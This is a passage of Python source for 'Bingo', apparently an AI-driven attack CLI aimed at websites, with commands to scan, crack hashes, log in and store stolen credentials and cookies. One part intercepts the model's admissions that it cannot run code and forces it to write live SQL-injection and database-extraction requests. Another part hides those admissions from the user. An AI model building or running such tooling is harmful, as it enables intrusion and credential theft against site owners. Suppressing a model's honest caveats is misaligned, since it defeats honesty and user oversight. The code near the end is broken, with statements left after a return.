            r"(database|db|데이터베이스).{0,30}(접근|access|추출|extract|dump).{0,20}(성공|success|완료)",
            r"(admin|관리자).{0,20}(로그인|login|접근|access).{0,20}(성공|success|완료)",
            r"(서버|server).{0,20}(접근|access|침투|compromise).{0,20}(성공|success|완료)",
            # 데이터 추출 주장
            r"(추출|extracted|dumped).{0,30}(table|column|data|password|hash)",
            r"(获取|提取|拿到).{0,20}(密码|账号|凭证|数据库|hash)",
            r"(注入成功|绕过成功|攻击成功|漏洞确认)",
        ]
        _has_unproven_conclusion = (
            not _has_code_block
            and any(_re.search(p, full_response, _re.IGNORECASE) for p in _conclusion_patterns)
        )

        # ── 환각 감지 시 차단 및 강제 재실행 요구 ────────────────────────
        _reasons = []
        if _is_json_plan:
            _reasons.append("JSON PLAN (not Python code)")
        if _is_confession:
            _reasons.append("AI SELF-CONFESSION (admitted no real execution)")
        if _has_fake_creds:
            _reasons.append("FAKE CREDENTIALS (invented without code execution)")
        if _has_unproven_conclusion:
            _reasons.append("UNPROVEN CONCLUSION (claimed success without running code)")

        if _reasons:
            _reason_str = " | ".join(_reasons)
            self.console.print(
                f"\n[{THEME['error']}]"
                f"╔══════════════════════════════════════════════════════════╗\n"
                f"║  ⛔ TEXT-LEVEL HALLUCINATION INTERCEPTED                 ║\n"
                f"║  REASON: {_reason_str[:50]:<50} ║\n"
                f"║  → FORCING REAL PYTHON HTTP EXECUTION                   ║\n"
                f"╚══════════════════════════════════════════════════════════╝"
                f"[/]\n"
            )

            _force_msg = (
                "[BINGO RUNTIME INTERCEPTED HALLUCINATION]\n"
                f"REASON: {_reason_str}\n\n"
                "RULE: You CANNOT claim vulnerability found / attack success / DB access\n"
                "      WITHOUT a Python code block that produced HTTP evidence.\n"
                "MANDATORY: Write REAL Python requests.get/post code that PROVES the claim.\n"
                "DO NOT return JSON plans. DO NOT invent credentials or results.\n"
                "DO NOT say 'my environment is limited to text'.\n"
                "EVERY conclusion MUST come from actual HTTP response output.\n\n"
                f"Original task: {original_text[:200]}\n\n"
                "Now write Python code that actually executes and proves the finding:"
            )
            self.history.append(Message(role="user", content=_force_msg))
            _retry = self._stream_response(
                model.chat_stream(self._build_messages(skill_context))
            )
            if _retry:
                self.history.pop()
                return _retry
            self.history.pop()

        return full_response

    @staticmethod
    def _filter_agent_noise(text: str) -> str:
        """AWAITING_BINGO_EXECUTION 등 내부 제어 키워드를 화면에서 제거."""
        import re
        text = re.sub(r"\n?AWAITING_BINGO_EXECUTION\n?", "", text)
        from ..i18n import t as _t
        text = re.sub(r"\n?TASK_COMPLETE\n?", f"\n✅ {_t('task_complete', 'Task complete')}\n", text)
        text = re.sub(r"\n?MISSION_COMPLETE\n?", f"\n✅ {_t('mission_complete', 'Mission complete')}\n", text)
        return text

    def _collapse_code_blocks(self, text: str) -> str:
        """Python/bash 코드 블록을 접어서 한 줄 요약으로 교체.
        Cursor처럼 '무엇을 하는지'만 보여주고 소스코드는 숨김.
        """
        import re
        _s = self.s
        _lang = getattr(self.config, "lang", "en")

        # 코드 의도 레이블 — 언어별
        _intent_map = {
            "sqli":  {"ko": "SQLi 탐지",    "zh": "SQLi 检测",     "en": "SQLi detect"},
            "waf":   {"ko": "WAF 탐지",     "zh": "WAF 检测",      "en": "WAF detect"},
            "union": {"ko": "DB 추출",      "zh": "DB 提取",       "en": "DB extract"},
            "table": {"ko": "테이블/DB 열거","zh": "表/DB 枚举",    "en": "Table/DB enum"},
            "cred":  {"ko": "자격증명 추출", "zh": "凭据提取",      "en": "Cred extract"},
            "crawl": {"ko": "사이트 크롤링", "zh": "站点爬取",      "en": "Site crawl"},
            "http":  {"ko": "HTTP 요청",    "zh": "HTTP 请求",     "en": "HTTP request"},
            "port":  {"ko": "포트 스캔",    "zh": "端口扫描",      "en": "Port scan"},
        }

        def _get_intent(key: str) -> str:
            return _intent_map.get(key, {}).get(_lang, _intent_map.get(key, {}).get("en", key))

        def _summarize_code(lang: str, code: str) -> str:
            lines = [l.strip() for l in code.splitlines() if l.strip() and not l.strip().startswith("#")]
            total = len(code.splitlines())

            code_lower = code.lower()
            if "sql" in code_lower or "sqli" in code_lower or "injection" in code_lower:
                intent = _get_intent("sqli")
            elif "waf" in code_lower or "cloudflare" in code_lower or "firewall" in code_lower:
                intent = _get_intent("waf")
            elif "union" in code_lower or "information_schema" in code_lower:
                intent = _get_intent("union")
            elif "database()" in code_lower or "table_name" in code_lower:
                intent = _get_intent("table")
            elif "password" in code_lower or "passwd" in code_lower or "credential" in code_lower:
                intent = _get_intent("cred")
            elif "crawl" in code_lower or "href" in code_lower or "sitemap" in code_lower:
                intent = _get_intent("crawl")
            elif "httpx" in code_lower or "requests" in code_lower:
                intent = _get_intent("http")
            elif "nmap" in code_lower or "socket" in code_lower or "port" in code_lower:
                intent = _get_intent("port")
            else:
                intent = lines[0][:50] if lines else "script"

            icon = "🐍" if lang == "python" else "⚡"
            _wait_label = _s.get("exec_waiting", "Waiting to execute")
            return (
                f"\n[dim]┌─ {icon} {lang.upper()} [{intent}] — {total}L[/dim]\n"
                f"[dim]│  {lines[0][:70] if lines else ''}[/dim]\n"
                f"[dim]│  {lines[1][:70] if len(lines) > 1 else ''}[/dim]\n"
                f"[dim]└─ ... ({_wait_label})[/dim]\n"
            )

        def replacer(m: re.Match) -> str:
            lang = (m.group(1) or "").strip().lower() or "code"
            code = m.group(2)
            if lang in ("python", "py", "bash", "sh"):
                return _summarize_code(lang if lang in ("python", "bash") else "python", code)
            return m.group(0)

        result = re.sub(r"```(\w*)\n(.*?)```", replacer, text, flags=re.DOTALL)
        # 스트리밍 중 닫히지 않은 코드 블록도 접기
        result = re.sub(
            r"```(\w+)\n((?:.|\n){30,}?)$",
            lambda m: _summarize_code(
                m.group(1) if m.group(1) in ("python", "bash") else "python",
                m.group(2)
            ),
            result,
            flags=re.DOTALL,
        )
        return result

    def _stream_response(self, stream: Iterator[StreamChunk]) -> str:
        full = ""
        _interrupted = False  # Ctrl+C로 스트림이 중단됐는지 여부

        self.console.print(f"\n[{THEME['secondary']}]bingo[/] [{THEME['dim']}]▸[/]", end=" ")

        # 스트리밍 중: 코드 블록 접힌 상태로 실시간 표시
        with Live(console=self.console, refresh_per_second=20, transient=True) as live:
            buf = Text()
            for chunk in stream:
                # ★ Ctrl+C 감지 시 스트림 즉시 중단
                if self._agent_stop_flag.is_set():
                    _interrupted = True
                    break
                if chunk.error:
                    live.stop()
                    self._error(f"{self.s['api_error']}: {chunk.error}")
                    return ""
                if chunk.text:
                    full += chunk.text
                    visible = self._filter_ai_monologue(full)
                    # 스트리밍 중: 코드 블록 접기 + 내부 키워드 제거
                    collapsed = self._collapse_code_blocks(visible)
                    collapsed = self._filter_agent_noise(collapsed)
                    buf = Text.from_markup(collapsed) if "[dim]" in collapsed else Text(collapsed, style="white")
                    live.update(buf)

        # ★ Live 컨텍스트 종료 후 중단 메시지 출력 (Live가 화면을 지우기 전에 출력하면 사라짐)
        if _interrupted:
            _lang = getattr(self.config, "lang", "en")
            _stop_msg = {
                "ko": "⏸ 스트리밍 중단됨 — 힌트를 입력하거나 Enter로 루프를 멈춥니다",
                "zh": "⏸ 流式传输已中断 — 输入提示或按 Enter 停止循环",
                "en": "⏸ Streaming interrupted — type a hint or press Enter to stop the loop",
            }.get(_lang, "⏸ Interrupted")
            self.console.print(f"[{THEME['warn']}]{_stop_msg}[/]")

        # 최종 출력: 코드 블록 접기 + 내부 제어 키워드 제거
        final = self._filter_ai_monologue(full)
        display = self._collapse_code_blocks(final)
        display = self._filter_agent_noise(display)
        # SKILL_LOAD 선언 줄은 유저에게 숨김 (처리는 됨)
        import re as _re
        display = _re.sub(r"SKILL_LOAD:\s*[^\n]*\n?", "", display)

        self.console.print()
        try:
            _has_rich = "[dim]" in display or "[bold" in display
            _has_md   = "**" in display or "\n# " in display or "\n## " in display

            if _has_rich and _has_md:
                # Rich 마크업과 Markdown 혼재 — Rich 태그 먼저 렌더링, 나머지 Markdown
                # 코드 블록 요약([dim]...[/dim])을 Plain text로 변환 후 Markdown 렌더
                import re as _re2
                plain = _re2.sub(
                    r"\[/?(?:dim|bold[^]]*|red[^]]*|green[^]]*|warn[^]]*)\]",
                    "", display
                )
                self.console.print(Markdown(plain))
            elif _has_rich:
                # Rich 마크업만 있음 — markup=True로 렌더링
                self.console.print(display)
            elif _has_md:
                self.console.print(Markdown(display))
            else:
                # 순수 텍스트 — URL/특수문자 escape
                from rich.markup import escape as _resc
                self.console.print(_resc(display))
        except Exception:
            self.console.out(display)
        self.console.print()
        return final  # 실행에는 원본(full code) 반환

    @staticmethod
    def _filter_ai_monologue(text: str) -> str:
        """AI 내부 독백 / thinking 텍스트 필터링.

        처리 순서:
          1. <think>...</think> 태그 블록 제거
          2. 단락(빈 줄로 구분) 단위 독백 필터 — 중국어/영어 시작 패턴
          3. 줄 단위 영어 독백 필터 (단일 라인 독백)
        """
        import re

        # ── 1. <think> 태그 블록 제거 ────────────────────────────────
        text = re.sub(r"<think>.*?</think>", "", text, flags=re.DOTALL | re.IGNORECASE)

        # ── 2. 단락 단위 필터 ────────────────────────────────────────
        # deepseek 계열이 <think> 없이 중국어 reasoning을 바로 출력할 때 처리
        # 단락의 첫 줄이 아래 패턴으로 시작하면 단락 전체를 버림
        _PARA_START_PATTERNS = (
            # ── 중국어 자기참조 (deepseek reasoning) ──
            r"^我需要",                      # 我需要在当前环境...
            r"^真正的执行是模拟的",
            r"^实际上在对话中",
            r"^实际上我无法真正",
            r"^我只能依赖预训练",
            r"^我将假设我已经执行",
            r"^根据BINGO规则",
            r"^然而根据BINGO",
            r"^因此我将描述",
            r"^为了平衡",
            r"^我可以先输出",
            r"^但需要真实数据",
            r"^我会先输出",
            r"^考虑到韩国网站",
            r"^执行后，将获得",
            r"^但时间有限，我选择",
            r"^我将在回答中提供完整的Python",
            r"^但我可以先输出侦察",
            r"^没有网络连接，我只能",
            r"^为了推进",
            r"^但更合乎规则的做法",
            r"^按照BINGO的规则",
            r"^然而作为一个自主代理",
            r"^需要谨慎，避免幻觉",
            r"^更好的方法是直接给出",
            r"^按照.*规则，我应",
            r"^我期望被反馈结果",
            r"^因此，我会给出侦察脚本",
            r"^在本对话中",
            r"^当前对话中，",
            r"^我需要继续下一个回复",
            r"^这样有风险",
            r"^但在本对话中，用户",
            # ── 한국어 자기참조 (모델이 한국어로 thinking 출력 시) ──
            r"^저는 실제로 실행할 수 없",
            r"^실제로는 스크립트를 실행할 수 없",
            r"^시뮬레이션 결과를 제공",
            r"^가상으로 실행한 것처럼",
            r"^BINGO 규칙에 따라",
            r"^실제 네트워크에 접근할 수 없",
            r"^네트워크 연결이 없으므로",
            r"^스크립트를 직접 실행할 수 없",
            r"^저는 AI이므로 직접",
            r"^실제 환경에서 실행할 수 없",
            r"^따라서 결과를 시뮬레이션",
            r"^실행 결과를 가상으로",
            r"^사전 학습된 지식에만",
            # ── 영어 자기참조 ──
            r"^I'll simulate\b",
            r"^I need to produce\b",
            r"^As an AI[,\s]",
            r"^I can't actually run\b",
            r"^I can simulate\b",
            r"^I must provide\b",
            r"^Since I can't actually\b",
            r"^I'll pretend\b",
            r"^Since this is a (?:fake|simulated)\b",
            r"^I'll have to generate\b",
            r"^I'll produce the final\b",
            r"^I need to output\b",
            r"^The user likely expects\b",
        )

        def _is_monologue_para(para: str) -> bool:
            first = para.strip().split("\n")[0].strip()
            return any(re.search(pat, first, re.IGNORECASE) for pat in _PARA_START_PATTERNS)

        # 빈 줄 2개 이상으로 단락 분리
        paragraphs = re.split(r"\n{2,}", text)
        kept_paras = [p for p in paragraphs if not _is_monologue_para(p)]
        text = "\n\n".join(kept_paras)

        # ── 3. 줄 단위 필터 (단락 필터를 빠져나온 단일 독백 라인 처리) ──
        _LINE_PATTERNS = (
            r"^I'll simulate\b",
            r"^I need to produce\b",
            r"^As an AI[,\s]",
            r"^I can't actually run\b",
            r"^I can simulate\b",
            r"^I must provide\b",
            r"^Since I can't actually\b",
            r"^For the sake of\b",
            r"^In the context of\b",
            r"^I'll pretend\b",
            r"^I'll generate\b",
            r"^I'll note that\b",
            r"^Since this is a (?:fake|simulated)\b",
            r"^Better: I'll\b",
            r"^I'll have to generate\b",
            r"^I'll produce the final\b",
            r"^I need to output\b",
            r"^I've redacted\b",
            r"^Now, output the final\b",
            r"^output the final response\b",
            r"^The user likely expects\b",
        )
        filtered_lines: list[str] = []
        skip = False
        for line in text.splitlines():
            stripped = line.strip()
            if any(re.match(pat, stripped, re.IGNORECASE) for pat in _LINE_PATTERNS):
                skip = True
                continue
            # 독백 줄 이후 빈 줄 / 코드블록 / 헤딩이 나오면 skip 해제
            if skip and (stripped == "" or stripped.startswith("```") or stripped.startswith("#")):
                skip = False
            if not skip:
                filtered_lines.append(line)
        return "\n".join(filtered_lines).strip()

    # ── 사용자 메시지 출력 ────────────────────────────────────────
    def _print_user(self, text: str) -> None:
        self.console.print(
            f"\n[{THEME['accent']}]{self.s['you']}[/] [{THEME['dim']}]▸[/] "
            f"[white]{text}[/]"
        )

    # ── 슬래시 명령어 ─────────────────────────────────────────────
    def _handle_command(self, cmd: str) -> None:
        parts = cmd.split(None, 1)
        name = parts[0].lower()
        arg = parts[1].strip() if len(parts) > 1 else ""

        dispatch = {
            "/help":    self._cmd_help,
            "/clear":   self._cmd_clear,
            "/model":   self._cmd_model,
            "/config":  self._cmd_config,
            "/history": self._cmd_history,
            "/export":  self._cmd_export,
            "/lang":    self._cmd_lang,
            "/quit":    self._cmd_quit,
            "/exit":    self._cmd_quit,
            "/session": self._cmd_session,
        }
        fn = dispatch.get(name)
        if fn:
            fn()
        elif name == "/skill":
            if arg.startswith("install "):
                self._cmd_skill_install(arg[8:].strip())
            elif arg.startswith("load "):
                # '/skill load <name>' — hack-skills는 이미 내장, 별도 설치 불필요
                skill_name = arg[5:].strip()
                content = self._load_skill_content([skill_name])
                if content:
                    self.console.print(
                        f"[{THEME['success']}]⚡ {self.s.get('skill_already_builtin', 'Skill already built-in').format(name=skill_name)}[/]"
                    )
                else:
                    self.console.print(
                        f"[{THEME['warn']}]{self.s.get('skill_not_found_tip', 'Skill not found').format(name=skill_name)}[/]"
                    )
            else:
                self._cmd_skill(arg)
        elif name == "/tools":
            self._cmd_tools(arg)
        elif name == "/install":
            # /install exe-deps  — Playwright-style auto-installer
            _arg = arg.lower().strip()
            if _arg in ("exe-deps", "exe", "pe-deps", "exe-analyzer",
                        "exe deps", "exe dependencies", "pe deps"):
                self._cmd_install_exe_deps()
            else:
                self._warn(
                    "Usage: /install exe-deps\n"
                    "       Installs EXE Phase 0 analysis libraries (pefile, lief, yara, ssdeep, requests)"
                )
        elif name == "/scan":
            if arg:
                self._cmd_scan(arg)
            else:
                self._warn("Usage: /scan <url>  예) /scan https://target.co.kr")
        elif name == "/mscan":
            if arg:
                self._cmd_mscan(arg)
            else:
                self._warn("Usage: /mscan <url>  예) /mscan https://target.co.kr")
        elif name == "/waf":
            # /waf 명령은 제거됨 → AI에게 직접 탐지 코드 작성 위임
            target = arg or "https://target.com"
            self._send_message(
                f"{target} 사이트의 WAF와 보안 장치를 탐지해줘. "
                f"Python httpx로 직접 헤더, 응답 패턴 분석해서 식별해."
            )
        elif name == "/login":
            self._cmd_login(arg)
        elif name == "/cred":
            self._cmd_cred(arg)
        elif name == "/session":
            if arg.strip().lower() == "clear":
                self._auth_session = {
                    "login_url": "", "username": "", "password": "",
                    "cookies": {}, "evidence": "", "active": False,
                }
                self._success("세션 초기화 완료.")
            else:
                self._cmd_session()
        elif name == "/crack":
            self._cmd_crack(arg)
        elif name == "/hint":
            self._cmd_hint(arg)
        elif name == "/retry":
            self._cmd_retry()
        elif name == "/stop":
            self._agent_stop_flag.set()
            self._stop_crack_flag.set()
            self.console.print(f"[{THEME['warn']}]{self.s['hash_stop_signal']}[/]")
        elif name == "/undo":
            steps = int(arg) if arg.isdigit() else 1
            self._cmd_undo(steps)
        elif name == "/snapshots":
            self._cmd_snapshots()
        elif name == "/cost":
            self._cmd_cost()
        else:
            self._warn(self.s["cmd_unknown"].format(name=name))

    def _cmd_help(self) -> None:
        self.console.print(
            Panel(
                self.s["help_text"],
                title=f"[{THEME['primary']}]BINGO COMMANDS[/]",
                border_style=THEME["primary"],
            )
        )

    def _cmd_clear(self) -> None:
        self._clear()
        self._print_banner()

    def _cmd_quit(self) -> None:
        self.console.print(f"[{THEME['primary']}]{self.s['goodbye']}[/]")
        sys.exit(0)

    # ── /login <url> <username> <password> ───────────────────────────
    def _cmd_login(self, arg: str) -> None:
        """실제 HTTP 로그인을 수행하고 세션 쿠키를 저장한다."""
        parts = arg.split()
        if len(parts) < 3:
            self._warn(
                self.s.get(
                    "login_usage",
                    "사용법: /login <url> <username> <password>\n"
                    "예) /login https://target.com/manager/login.asp admin admin123",
                )
            )
            return

        url, username, password = parts[0], parts[1], parts[2]

        from ..tools.login_executor import LoginExecutor

        def _log(msg: str):
            self.console.print(f"[{THEME['dim']}]{msg}[/]")

        executor = LoginExecutor(on_log=_log)
        result = executor.login(url, username, password)

        if result.success:
            # 세션 저장
            self._auth_session.update({
                "login_url": url,
                "username": username,
                "password": password,
                "cookies": result.cookies,
                "evidence": result.evidence,
                "active": True,
            })
            self.console.print(
                f"\n[{THEME['success']}]{result.message}[/]"
            )
            if result.cookies:
                self.console.print(
                    f"[{THEME['accent']}]세션 쿠키 저장:[/] "
                    f"[white]{'; '.join(f'{k}={v}' for k, v in result.cookies.items())}[/]"
                )
            self.console.print(
                f"[{THEME['dim']}]이후 모든 AI 요청에 세션 쿠키가 자동으로 주입됩니다.[/]\n"
            )
            self._add_to_log(
                "system",
                f"[LOGIN SUCCESS] {url} | {username} | evidence={result.evidence} | "
                f"cookies={result.cookies}",
            )
        else:
            self.console.print(f"\n[{THEME['error']}]{result.message}[/]\n")
            self._warn(
                self.s.get(
                    "login_failed_tip",
                    "직접 브라우저로 로그인해서 쿠키를 확인하고 /cred 명령어로 수동 입력하세요.",
                )
            )

    # ── /cred <username> <password> [cookie=value ...] ───────────────
    def _cmd_cred(self, arg: str) -> None:
        """자격증명만 저장 (로그인 없이). 쿠키를 직접 지정할 수도 있다."""
        parts = arg.split()
        if not parts:
            # 현재 저장된 자격증명 표시
            if self._auth_session.get("active"):
                self.console.print(
                    f"[{THEME['accent']}]저장된 자격증명:[/]\n"
                    f"  URL: {self._auth_session['login_url'] or '(없음)'}\n"
                    f"  ID: {self._auth_session['username']}\n"
                    f"  PW: {'*' * len(self._auth_session['password'])}\n"
                    f"  쿠키: {self._auth_session['cookies']}\n"
                    f"  증거수준: {self._auth_session['evidence']}"
                )
            else:
                self._info(self.s.get("cred_none", "저장된 자격증명이 없습니다."))
            return

        if len(parts) < 2:
            self._warn(
                self.s.get(
                    "cred_usage",
                    "사용법: /cred <username> <password> [COOKIE_NAME=value ...]\n"
                    "예) /cred admin admin123\n"
                    "예) /cred admin admin123 SESSIONID=abc123",
                )
            )
            return

        username, password = parts[0], parts[1]
        extra_cookies: dict[str, str] = {}
        for token in parts[2:]:
            if "=" in token:
                k, v = token.split("=", 1)
                extra_cookies[k] = v

        self._auth_session.update({
            "login_url": self._auth_session.get("login_url", ""),
            "username": username,
            "password": password,
            "cookies": extra_cookies,
            "evidence": "MANUAL",
            "active": True,
        })
        self.console.print(
            f"[{THEME['success']}]✅ 자격증명 저장 완료[/]\n"
            f"  ID: {username}  PW: {'*' * len(password)}"
        )
        if extra_cookies:
            self.console.print(f"  쿠키: {extra_cookies}")
        self.console.print(
            f"[{THEME['dim']}]이후 AI 요청에서 이 자격증명을 자동으로 사용합니다.[/]\n"
        )

    # ── /session — 현재 인증 세션 상태 확인 / 초기화 ─────────────────
    def _cmd_session(self) -> None:
        """현재 인증 세션 상태를 출력하거나 초기화한다."""
        if self._auth_session.get("active"):
            self.console.print(
                f"\n[{THEME['accent']}]🔐 활성 세션[/]\n"
                f"  로그인 URL : {self._auth_session['login_url'] or '(미설정)'}\n"
                f"  ID         : {self._auth_session['username']}\n"
                f"  PW         : {'*' * len(self._auth_session['password'])}\n"
                f"  증거수준   : [{THEME['success']}]{self._auth_session['evidence']}[/]\n"
                f"  쿠키       : {self._auth_session['cookies']}\n"
            )
            from ..lang.strings import get_strings
            s = get_strings(getattr(self.config, "lang", "ko"))
            self.console.print(
                f"[{THEME['dim']}]세션 초기화: /session clear[/]"
            )
        else:
            self._info("활성 세션 없음. /login 또는 /cred 로 세션을 설정하세요.")

    # ────────────────────────────────────────────────────────────────
    # /hint 명령어 — 실행 루프 실행 중이 아닐 때도 다음 AI 호출에 힌트 삽입
    # ────────────────────────────────────────────────────────────────
    def _cmd_hint(self, hint_text: str) -> None:
        """/hint <메시지> — 다음 AI 응답에 사용자 힌트를 즉시 주입한다.
        실행 루프 중 Ctrl+C 없이도 방향 전환 가능.
        """
        _lang = getattr(self.config, "lang", "en")
        if not hint_text.strip():
            _usage = {
                "ko": "사용법: /hint <메시지>  예) /hint 캡차 우회하지 말고 다른 경로 시도해",
                "zh": "用法: /hint <消息>  例) /hint 不要绕过验证码，试试其他路径",
                "en": "Usage: /hint <message>  e.g. /hint skip captcha, try other endpoints",
            }.get(_lang, "Usage: /hint <message>")
            self._warn(_usage)
            return

        _hint_label = {
            "ko": f"[사용자 힌트 — 즉시 반영]: {hint_text}",
            "zh": f"[用户提示 — 立即应用]: {hint_text}",
            "en": f"[USER HINT — apply immediately]: {hint_text}",
        }.get(_lang, f"[USER HINT]: {hint_text}")

        self.history.append(Message(role="user", content=_hint_label))

        _ok = {
            "ko": f"💬 힌트가 다음 AI 호출에 주입됩니다: {hint_text[:50]}",
            "zh": f"💬 提示已注入下一次AI调用: {hint_text[:50]}",
            "en": f"💬 Hint injected into next AI call: {hint_text[:50]}",
        }.get(_lang, f"💬 Hint injected: {hint_text[:50]}")
        self._success(_ok)

        # 즉시 AI에게 힌트를 전달하고 응답받기
        model_cfg = self.config.get_active_model_config()
        if model_cfg:
            from ..models.registry import ModelRegistry as _MR
            _m = _MR.build(model_cfg)
            resp = self._stream_response(_m.chat_stream(self._build_messages("")))
            if resp:
                self.history.append(Message(role="assistant", content=resp))
                self._append_to_session_log("assistant", resp)

    # ────────────────────────────────────────────────────────────────
    # /retry — 마지막 실패 단계 재실행
    # ────────────────────────────────────────────────────────────────
    def _cmd_retry(self) -> None:
        """/retry — 마지막 실행 결과를 AI에게 다시 보내 재시도 지시."""
        _lang = getattr(self.config, "lang", "en")
        last = getattr(self, "_last_exec_result", "")
        if not last:
            _no_result = {
                "ko": "⚠ 재시도할 이전 실행 결과가 없습니다. 먼저 작업을 실행하세요.",
                "zh": "⚠ 没有可重试的上次执行结果。请先运行任务。",
                "en": "⚠ No previous execution result to retry. Run a task first.",
            }.get(_lang, "⚠ No previous result to retry.")
            self._warn(_no_result)
            return

        _retry_msg = {
            "ko": (
                "[RETRY 요청]\n"
                "아래 실행 결과에서 실패한 부분을 분석하고, "
                "다른 접근법으로 재시도하는 코드를 작성하세요.\n"
                "처음부터 다시 시작하지 말고 실패 원인만 수정하세요.\n\n"
                f"=== 마지막 실행 결과 ===\n{last[:2000]}\n=== END ==="
            ),
            "zh": (
                "[重试请求]\n"
                "分析以下执行结果中的失败部分，"
                "编写使用不同方法重试的代码。\n"
                "不要从头开始，只修复失败原因。\n\n"
                f"=== 上次执行结果 ===\n{last[:2000]}\n=== END ==="
            ),
            "en": (
                "[RETRY REQUEST]\n"
                "Analyze the failure in the result below and write code "
                "that retries with a different approach.\n"
                "Do NOT restart from scratch — fix only what failed.\n\n"
                f"=== Last Execution Result ===\n{last[:2000]}\n=== END ==="
            ),
        }.get(_lang, f"[RETRY] Fix what failed:\n{last[:2000]}")

        self.history.append(Message(role="user", content=_retry_msg))

        _banner = {
            "ko": "🔁 마지막 실패 단계 재시도 중...",
            "zh": "🔁 正在重试上次失败步骤...",
            "en": "🔁 Retrying last failed step...",
        }.get(_lang, "🔁 Retrying...")
        self.console.print(f"[{THEME['warn']}]{_banner}[/]\n")

        model_cfg = self.config.get_active_model_config()
        if model_cfg:
            from ..models.registry import ModelRegistry as _MR
            _m = _MR.build(model_cfg)
            resp = self._stream_response(_m.chat_stream(self._build_messages("")))
            if resp:
                self.history.append(Message(role="assistant", content=resp))
                self._append_to_session_log("assistant", resp)
                # 새 코드 블록이 있으면 바로 실행
                self._execute_ai_commands(resp)

    # ────────────────────────────────────────────────────────────────
    # 알림 — 작업 완료 / 크리티컬 취약점 발견 시
    # ────────────────────────────────────────────────────────────────
    def _send_notification(self, title: str, message: str, critical: bool = False) -> None:
        """macOS 시스템 알림 + 터미널 벨 소리."""
        import subprocess, sys
        # 터미널 벨
        print("\a", end="", flush=True)
        # macOS 알림
        if sys.platform == "darwin":
            try:
                sound = "Basso" if critical else "Glass"
                script = (
                    f'display notification "{message}" '
                    f'with title "{title}" '
                    f'sound name "{sound}"'
                )
                subprocess.run(
                    ["osascript", "-e", script],
                    capture_output=True, timeout=3,
                )
            except Exception:
                pass

    # ── 자연어 자격증명 자동 파싱 ────────────────────────────────────
    def _try_natural_language_login(self, text: str) -> None:
        """
        사용자가 자연어로 자격증명을 제공했을 때 자동으로 세션에 저장.
        예) "아이디는 admin이고 비번은 1234야"
            "id: admin, pw: pass123"
            "admin / pass123 로 로그인해줘"
        로그인 URL 이 있으면 /login 을 자동 실행, 없으면 /cred 에 저장.
        """
        import re as _re
        t = text.strip()

        # 로그인 의도 감지 키워드
        login_intent = any(kw in t for kw in [
            "로그인", "login", "로그인해", "접속해", "들어가", "로그인 해줘",
            "로그인해줘", "로그인 해", "접속",
        ])
        cred_intent = any(kw in t for kw in [
            "아이디", "id:", "ID:", "비번", "비밀번호", "password:", "pw:", "PW:",
            "passwd:", "계정", "account",
        ])

        if not (login_intent or cred_intent):
            return

        # username 추출 패턴
        user_patterns = [
            r'아이디[는은이가\s]*[:：]?\s*["\']?(\S+?)["\']?[\s,이고이야。\.]',
            r'id\s*[:：]\s*["\']?(\S+?)["\']?[\s,]',
            r'(?:user|username|userid)\s*[:：]\s*["\']?(\S+?)["\']?[\s,]',
            r'["\']?(\S+?)["\']?\s*/\s*["\']?(\S+?)["\']?\s+(?:로|으로|로그인)',
            r'(?:계정|아이디)\s+["\']?(\w+)["\']?',
        ]
        # password 추출 패턴
        pass_patterns = [
            r'비번[은는이가\s]*[:：]?\s*["\']?(\S+?)["\']?[\s,이고이야。\.]',
            r'비밀번호[는은이가\s]*[:：]?\s*["\']?(\S+?)["\']?[\s,이고이야。\.]',
            r'pw\s*[:：]\s*["\']?(\S+?)["\']?[\s,]',
            r'password\s*[:：]\s*["\']?(\S+?)["\']?[\s,]',
            r'passwd\s*[:：]\s*["\']?(\S+?)["\']?[\s,]',
        ]

        username = None
        password = None

        for pat in user_patterns:
            m = _re.search(pat, t, _re.IGNORECASE)
            if m:
                username = m.group(1).strip("'\",.!?")
                break

        for pat in pass_patterns:
            m = _re.search(pat, t, _re.IGNORECASE)
            if m:
                password = m.group(1).strip("'\",.!?")
                break

        if not (username and password):
            return  # 파싱 실패 → AI에게 그냥 전달

        # URL 추출
        url_m = _re.search(r'https?://\S+', t)
        url = url_m.group(0).rstrip(",.") if url_m else self._auth_session.get("login_url", "")

        if url and login_intent:
            self.console.print(
                f"[{THEME['dim']}]🔍 자격증명 감지 → /login 자동 실행[/]\n"
                f"   URL: {url}  ID: {username}  PW: {'*' * len(password)}"
            )
            self._cmd_login(f"{url} {username} {password}")
        elif username and password:
            self.console.print(
                f"[{THEME['dim']}]🔍 자격증명 감지 → /cred 저장 (URL 미감지)[/]\n"
                f"   ID: {username}  PW: {'*' * len(password)}"
            )
            self._cmd_cred(f"{username} {password}")

    def _cmd_history(self) -> None:
        if not self.history:
            self._info(self.s["history_empty"])
            return
        for i, m in enumerate(self.history, 1):
            color = THEME["accent"] if m.role == "user" else THEME["secondary"]
            label = self.s["you"] if m.role == "user" else "bingo"
            preview = m.content[:120].replace("\n", " ")
            self.console.print(f"[{color}]{i:3}. {label}[/] — {preview}")

    def _cmd_export(self) -> None:
        if not self.history:
            self._info(self.s["history_empty"])
            return
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = Path.cwd() / f"bingo_chat_{ts}.md"
        lines = [f"# Bingo Chat — {ts}\n"]
        for m in self.history:
            label = self.s["you"] if m.role == "user" else "bingo"
            lines.append(f"## {label}\n{m.content}\n")
        path.write_text("\n".join(lines), encoding="utf-8")
        self._success(f"{self.s['export_saved']}: {path}")

    def _cmd_config(self) -> None:
        table = Table(
            title=f"[{THEME['primary']}]{self.s['config_view']}[/]",
            border_style=THEME["primary"],
            show_header=True,
        )
        table.add_column("Key", style=THEME["secondary"])
        table.add_column("Value", style="white")
        table.add_row("lang", self.config.lang)
        table.add_row("active_model", self.config.active_model or "—")
        table.add_row("models", str(len(self.config.models)))
        self.console.print(table)

    def _cmd_lang(self) -> None:
        self.console.print(f"\n[{THEME['primary']}]{self.s['select_lang']}[/]")
        lang_list = list(SUPPORTED_LANGS.keys())   # ["ko", "zh", "en"]
        for i, (code, label) in enumerate(lang_list, 1):
            self.console.print(f"  [{THEME['secondary']}]{i}[/] — {label}  [{THEME['dim']}]({code})[/]")
        self.console.print()

        # 번호(1/2/3) 또는 코드(ko/zh/en) 둘 다 허용
        raw = Prompt.ask(
            f"[{THEME['primary']}][ko/zh/en/1/2/3][/]",
        ).strip().lower()

        # 번호 입력 시 코드로 변환
        num_map = {str(i + 1): code for i, code in enumerate(lang_list)}
        lang = num_map.get(raw, raw)

        if lang not in SUPPORTED_LANGS:
            self._warn(self.s["lang_invalid"].format(raw=raw))
            return

            self.config.lang = lang
            self.config.save()
            self.s = get_strings(lang)
        # 전역 i18n 동기화
        try:
